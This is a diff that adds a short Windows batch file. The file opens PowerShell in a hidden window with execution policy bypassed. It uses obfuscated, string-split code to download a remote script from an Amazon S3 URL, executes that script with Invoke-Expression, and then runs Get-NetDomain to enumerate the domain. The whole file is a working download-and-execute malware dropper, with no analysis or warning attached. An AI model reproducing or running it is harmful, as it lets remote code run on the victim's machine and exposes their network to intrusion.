@@ -1,0 +1,4 @@
+@echo off
+ @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -win 1 -InputFormat None -ExecutionPolicy Bypass -Command " iEx(iEx(Iex(iEx('(Ne{0}ect Ne{1}bClient)."DoWnlOAdstRiNG"("""{2}10w.s3.s{3}{4}?tk=Ry5xtg32VYYyy73""")' -f 'w-Obj', 't.We','https://q8g','a-east-1.amazonaws.c','om/leiame.txt'))));Get-NetDomain
+
+
